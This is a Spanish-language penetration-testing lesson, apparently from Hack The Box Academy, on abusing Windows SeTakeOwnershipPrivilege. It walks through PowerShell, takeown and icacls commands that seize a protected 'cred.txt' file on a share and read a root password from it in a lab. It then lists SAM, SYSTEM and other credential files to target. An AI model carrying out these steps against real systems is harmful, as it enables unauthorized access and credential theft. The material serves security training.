[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) le otorga a un usuario la capacidad de tomar posesión de cualquier "securable object" (objeto protegible), lo que incluye objetos de Active Directory, archivos/carpetas NTFS, impresoras, claves del registro, servicios y procesos. Este privilegio asigna los derechos de [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) sobre un objeto, lo que significa que el usuario puede cambiar el propietario dentro del descriptor de seguridad del objeto. Los administradores tienen asignado este privilegio por defecto. Aunque es raro encontrar una cuenta de usuario estándar con este privilegio, podríamos encontrar una cuenta de servicio que, por ejemplo, tenga la tarea de ejecutar trabajos de respaldo y snapshots de VSS con este privilegio asignado. También puede tener otros privilegios como `SeBackupPrivilege`, `SeRestorePrivilege` y `SeSecurityPrivilege` para controlar los privilegios de esta cuenta a un nivel más granular sin otorgarle derechos completos de administrador local. Estos privilegios por sí solos podrían usarse para escalar privilegios. Aún así, puede haber ocasiones en las que necesitemos tomar posesión de archivos específicos porque otros métodos están bloqueados o no funcionan como se espera. Abusar de este privilegio es un caso excepcional, pero vale la pena entenderlo en profundidad, especialmente porque podríamos encontrarnos en un escenario en un entorno de Active Directory donde podemos asignar este derecho a un usuario específico que podamos controlar y aprovecharlo para leer un archivo sensible en un recurso compartido.

![image](https://academy.hackthebox.com/storage/modules/67/change_owner.png)

La configuración se puede establecer en Group Policy bajo:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

![image](https://academy.hackthebox.com/storage/modules/67/setakeowner2.png)

Con este privilegio, un usuario podría tomar posesión de cualquier archivo u objeto y realizar cambios que podrían implicar acceso a datos sensibles, `Remote Code Execution (RCE)` o `Denial-of-Service (DOS)`.

Supongamos que encontramos un usuario con este privilegio o se lo asignamos a través de un ataque como el abuso de GPO utilizando [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). En ese caso, podríamos usar este privilegio para tomar control de una carpeta compartida o archivos sensibles como un documento que contiene contraseñas o una clave SSH.

---

## Leveraging the Privilege

### Reviewing Current User Privileges

Vamos a revisar los privilegios de nuestro usuario actual.

```r
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

### Enabling SeTakeOwnershipPrivilege

Note que el privilegio no está habilitado. Podemos habilitarlo usando este [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) detallado en [este](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, así como [este](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) otro que amplía el concepto inicial.

```r
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

### Choosing a Target File

A continuación, elige un archivo objetivo y confirma la propiedad actual. Para nuestros propósitos, apuntaremos a un archivo interesante encontrado en un recurso compartido. Es común encontrar recursos compartidos con directorios `Public` y `Private` configurados por departamento. Dado el rol de un usuario en la empresa, a menudo pueden acceder a archivos/directorios específicos. Incluso con una estructura como esta, un administrador de sistemas puede configurar incorrectamente los permisos en directorios y subdirectorios, haciendo que los recursos compartidos sean una fuente rica de información una vez que hemos obtenido credenciales de Active Directory (y, a veces, incluso sin necesidad de credenciales). Para nuestro escenario, supongamos que tenemos acceso al recurso compartido de archivos de la empresa objetivo y podemos navegar libremente por los subdirectorios `Private` y `Public`. En su mayor parte, encontramos que los permisos están configurados estrictamente y no hemos encontrado ninguna información interesante en la porción `Public` del recurso compartido. Al navegar por la porción `Private`, encontramos que todos los usuarios del dominio pueden listar el contenido de ciertos subdirectorios, pero reciben un mensaje de `Access denied` al intentar leer el contenido de la mayoría de los archivos. Durante nuestra enumeración, encontramos un archivo llamado `cred.txt` bajo el subdirectorio `IT` de la carpeta compartida `Private`.

Dado que nuestra cuenta de usuario tiene `SeTakeOwnershipPrivilege` (que puede haber sido ya concedido), o explotamos alguna otra configuración incorrecta como un GPO excesivamente permisivo para conceder a nuestra cuenta de usuario ese privilegio, podemos aprovecharlo para leer cualquier archivo que elijamos.

Nota: Tenga mucho cuidado al realizar una acción potencialmente destructiva como cambiar la propiedad del archivo, ya que podría causar que una aplicación deje de funcionar o interrumpir a los usuarios del objeto objetivo. Cambiar la propiedad de un archivo importante, como un archivo web.config en vivo, no es algo que haríamos sin el consentimiento de nuestro cliente primero. Además, cambiar la propiedad de un archivo enterrado en varios subdirectorios (mientras se cambian los permisos de cada subdirectorio en el camino) puede ser difícil de revertir y debe evitarse.

Vamos a comprobar nuestro archivo objetivo para obtener un poco más de información sobre él.

```r
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

### Checking File Ownership

Podemos ver que el propietario no se muestra, lo que significa que probablemente no tenemos suficientes permisos sobre el objeto para ver esos detalles. Podemos retroceder un poco y comprobar el propietario del directorio IT.

```r
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

Podemos ver que el recurso compartido de IT parece ser propiedad de una cuenta de servicio y contiene un archivo `cred.txt` con algunos datos dentro.

### Taking Ownership of the File

Ahora podemos usar el binario de Windows [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) para cambiar la propiedad del archivo.

```r
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

### Confirming Ownership Changed

Podemos confirmar la propiedad usando el mismo comando que antes. Ahora vemos que nuestra cuenta de usuario es la propietaria del archivo.

```r
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

### Modifying the File ACL

Es posible que aún no podamos leer el archivo y necesitemos modificar el ACL del archivo usando `icacls` para poder leerlo.

```r
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Vamos a otorgar a nuestro usuario todos los privilegios sobre el archivo objetivo.

```r
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

### Reading the File

Si todo salió según lo planeado, ahora podemos leer el archivo objetivo desde la línea de comandos, abrirlo si tenemos acceso a RDP, o copiarlo a nuestro sistema de ataque para un procesamiento adicional (como descifrar la contraseña de una base de datos KeePass).

```r
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!
```

Después de realizar estos cambios, querríamos hacer todo lo posible para revertir los permisos/la propiedad del archivo. Si no podemos por alguna razón, debemos alertar a nuestro cliente y documentar cuidadosamente las modificaciones en un apéndice de nuestro informe de entrega. Nuevamente, aprovechar este permiso puede considerarse una acción destructiva y debe realizarse con mucho cuidado. Algunos clientes pueden preferir que documentemos la capacidad de realizar la acción como evidencia de una mala configuración, pero no aprovechar completamente el fallo debido al posible impacto.

---

## When to Use?

### Files of Interest

Algunos archivos locales de interés pueden incluir:

```r
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

También podemos encontrar archivos de base de datos KeePass `.kdbx`, cuadernos de OneNote, archivos como `passwords.*`, `pass.*`, `creds.*`, scripts, otros archivos de configuración, archivos de disco duro virtual, y más que podemos apuntar para extraer información sensible y elevar nuestros privilegios y acceder más lejos.